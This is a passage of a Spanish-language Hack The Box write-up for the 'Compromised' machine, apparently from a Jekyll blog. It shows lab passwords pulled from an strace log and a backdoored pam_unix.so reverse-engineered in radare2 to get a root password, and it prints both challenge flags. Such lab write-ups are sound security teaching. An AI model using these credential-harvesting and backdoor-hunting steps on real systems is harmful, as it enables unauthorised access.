+log/cloud-init.log:2020-05-08 15:50:07,874 - __init__.py[DEBUG]: Adding user sysadmin
+log/cloud-init.log:2020-05-08 15:50:07,874 - util.py[DEBUG]: Running hidden command to protect sensitive input/output logstring: ['useradd', 'sysadmin', '--comment', 'compromise', '--groups', 'adm,cdrom,dip,plugdev,lxd,sudo', '--password', 'REDACTED', '--shell', '/bin/bash', '-m']
+log/cloud-init.log:2020-05-08 15:50:31,366 - cc_ssh_import_id.py[DEBUG]: User sysadmin is not configured for ssh_import_id
+log/cloud-init-output.log:ci-info: no authorized SSH keys fingerprints found for user sysadmin.
+log/installer/subiquity-debug.log.2150:2020-05-08 15:33:28,872 DEBUG subiquity.controllers.identity:73 IdentityController.done next_screen user_spec={'hostname': 'compromise', 'realname': 'compromise', 'username': 'sysadmin', 'password': '&lt;REDACTED&gt;'}
+lib/dpkg/info/systemd.postinst:# runtime-dir/sysadmin-dir/other packages (e.g. rsyslog)
+lib/dpkg/info/dash.postinst:		# The sysadmin wants it this way.  Who am I to argue?
+lib/dpkg/info/libssl1.0.0:amd64.postinst:	# update for a security issue, but planned by the sysadmin, not
+lib/dpkg/info/libssl1.1:amd64.postinst:	# update for a security issue, but planned by the sysadmin, not
+lib/dpkg/info/irqbalance.postinst:    # things the local sysadmin has added to the old /etc/default/irqbalance
+lib/dpkg/info/irqbalance.postinst:        # Insert a header to help sysadmin figure out why these things are here.
+lib/dpkg/info/irqbalance.postinst:        # been added to the file by the local sysadmin.
+lib/dpkg/status: Sudo is a program designed to allow a sysadmin to give limited root
+lib/dpkg/status: You should install ltrace if you need a sysadmin tool for tracking the
+lib/dpkg/status: common Linux/UNIX commands, reducing the amount of typing sysadmins
+lib/dpkg/status-old: Sudo is a program designed to allow a sysadmin to give limited root
+lib/dpkg/status-old: You should install ltrace if you need a sysadmin tool for tracking the
+lib/dpkg/status-old: common Linux/UNIX commands, reducing the amount of typing sysadmins
+lib/mysql/strace-log.dat:22102 03:10:59 write(2, "\33]0;sysadmin@compromised: /opt\7\33"..., 84) = 84
+lib/mysql/strace-log.dat:22102 03:11:00 write(2, "\33]0;sysadmin@compromised: /opt\7\33"..., 84) = 84
+lib/mysql/strace-log.dat:22102 03:11:03 write(2, "\33]0;sysadmin@compromised: /opt\7\33"..., 84) = 84
+lib/mysql/strace-log.dat:22227 03:11:09 stat("/home/sysadmin/.my.cnf", 0x7fff97cc5590) = -1 ENOENT (No such file or directory)
+lib/mysql/strace-log.dat:22227 03:11:09 stat("/home/sysadmin/.mylogin.cnf", 0x7fff97cc5590) = -1 ENOENT (No such file or directory)
+lib/mysql/strace-log.dat:22102 03:11:09 write(2, "\33]0;sysadmin@compromised: /opt\7\33"..., 84) = 84
+lib/mysql/strace-log.dat:22228 03:11:15 stat("/home/sysadmin/.my.cnf", 0x7ffdc5cfb790) = -1 ENOENT (No such file or directory)
+lib/mysql/strace-log.dat:22228 03:11:15 stat("/home/sysadmin/.mylogin.cnf", 0x7ffdc5cfb790) = -1 ENOENT (No such file or directory)
+lib/mysql/strace-log.dat:22102 03:11:15 write(2, "\33]0;sysadmin@compromised: /opt\7\33"..., 84) = 84
+lib/mysql/strace-log.dat:22229 03:11:18 stat("/home/sysadmin/.my.cnf", 0x7ffcd3f055a0) = -1 ENOENT (No such file or directory)
+lib/mysql/strace-log.dat:22229 03:11:18 stat("/home/sysadmin/.mylogin.cnf", 0x7ffcd3f055a0) = -1 ENOENT (No such file or directory)
+lib/mysql/strace-log.dat:22229 03:11:18 readlink("/home/sysadmin/.mysql_history", 0x7ffcd3f0a390, 511) = -1 ENOENT (No such file or directory)
+</code></pre>
+
+<p>Leemos el archivo y filtramos por <code>sysadmin y password</code>, para tratar de encontrar credenciales en texto claro.</p>
+
+<pre><code class="language-bash">mysql@compromised:/var$ cat lib/mysql/strace-log.dat | grep -iE "sysadmin|password"
+22102 03:10:59 write(2, "\33]0;sysadmin@compromised: /opt\7\33"..., 84) = 84
+22102 03:11:00 write(2, "\33]0;sysadmin@compromised: /opt\7\33"..., 84) = 84
+22102 03:11:03 write(2, "\33]0;sysadmin@compromised: /opt\7\33"..., 84) = 84
+22102 03:11:06 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
+22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0
+</code></pre>
+
+<p>Encontramos una credencial que si la validamos corresponde al usuario <code>sysadmin</code>, ahora podemos ir a su directorio personal y visualizar la primera flag <code>user.txt</code></p>
+
+<pre><code class="language-bash">mysql@compromised:/var$ su sysadmin
+Password: 
+sysadmin@compromised:/var$ whoami
+sysadmin
+sysadmin@compromised:/var$ cd /home/sysadmin/
+sysadmin@compromised:~$ cat user.txt 
+e0915cc0811946d4d341100789b6592e
+</code></pre>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Como la maquina se llama <code>compromised</code>, nos da una pista de que la maquina previamente ya fue comprometida, por lo tanto puedo pensar que para garantia de una escalada de privilegios se pudo dejar un <code>rootkit</code>.</p>
+
+<blockquote>
+  <p>Rootkit: Un rootkit es un tipo de software malicioso diseñado para dar la capacidad de introducirse en un dispositivo y hacerse con el control del mismo. Por lo general, los rootkits afectan el software o el sistema operativo del dispositivo que infectan, pero algunos pueden actuar sobre su hardware o firmware. Los rootkits operan en segundo plano, sin dar muestras de que están activos.</p>
+</blockquote>
+
+<p>Para poder detectarlo vamos a usar <code>linpeas.sh</code> del repositorio de <code>carlospolop</code>.</p>
+
+<ul>
+  <li><a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230611-b11e87f7">https://github.com/carlospolop/PEASS-ng/releases/tag/20230611-b11e87f7</a></li>
+</ul>
+
+<p>Ejecutamos el <code>linpeas</code> y encontramos que <code>.pam_unix.so</code> se encuentra oculto.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Compromissed/compro14.PNG" alt="" /></p>
+
+<blockquote>
+  <p>pam_unix.so: Este es el módulo estándar de autenticación de Unix. Utiliza llamadas estándar de las bibliotecas del sistema para recuperar y establecer la información de la cuenta, así como la autenticación. Usualmente esto se obtiene del archivo /etc/passwd y del archivo /etc/shadow también si shadow está habilitado.</p>
+</blockquote>
+
+<p>Como vemos el <code>pam_unix</code> toca temas de autenticación, vamos a traernoslo a nuestro equipo y analizarlo. Para ello vamos a hacer un bae64 del archivo y decodearlo en nuestro equipo.</p>
+
+<pre><code class="language-bash">sysadmin@compromised:/lib/x86_64-linux-gnu/security$ base64 -w 0 .pam_unix.so; echo
+</code></pre>
+
+<p>Una vez tengamos el archivo en nuestro equipo vamos a examinarlo con <code>radare2</code></p>
+
+<pre><code class="language-bash">❯ file pam_unix.so
+pam_unix.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=52d069272a0900ed4963258eab93237d38c6d1c4, with debug_info, not stripped
+❯ radare2 pam_unix.so
+Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
+ -- Select your architecture with: 'e asm.arch=&lt;arch&gt;' or r2 -a from the shell
+[0x000025c0]&gt; aaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze all functions arguments/locals
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Finding and parsing C++ vtables (avrr)
+[x] Type matching analysis for all functions (aaft)
+[x] Propagate noreturn information (aanr)
+[x] Integrate dwarf function information.
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[0x000025c0]&gt; afl
+0x000025c0    4 50   -&gt; 40   entry0
+0x00002c70   28 732  -&gt; 681  dbg.pam_sm_acct_mgmt
+0x00002f70   34 670  -&gt; 633  dbg.pam_sm_authenticate
+0x00004390   13 222  -&gt; 210  dbg.pam_sm_close_session
+0x00003210    6 116          dbg.pam_sm_setcred
+0x00003750  104 2863 -&gt; 2805 dbg.pam_sm_chauthtok
+0x00004280   13 262  -&gt; 256  dbg.pam_sm_open_session
+[0x000025c0]&gt; s dbg.pam_sm_authenticate
+[0x00002f70]&gt; pdf
+</code></pre>
+
+<p>Analizando vemos una intrucción que hace referencia a <code>pam_unix_auth.c</code>, con lo que parece ser una credencial, en dos partes similar al formato de una credencial que previamente obtuvimos <code>zlke~U3Env82m2-</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Compromissed/compro15.PNG" alt="" /></p>
+
+<p>Validamos y efectivamente la credencial corresponde al usuario <code>root</code>.</p>
+
+<pre><code class="language-bash">sysadmin@compromised:/lib/x86_64-linux-gnu/security$ su root
+Password: 
+root@compromised:/lib/x86_64-linux-gnu/security# whoami
+root
+</code></pre>
+
+<p>Lo que nos queda por hacer es dirigirnos al directorio personal del usuario <code>root</code> y visualizar la segunda flag <code>root.txt</code>.</p>
+
+<pre><code class="language-bash">root@compromised:/lib/x86_64-linux-gnu/security# cd /root/
+root@compromised:~# cat root.txt 
+e62293eadbdb5c168b024782d6943394
+</code></pre>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Compromised - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Compromissed" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
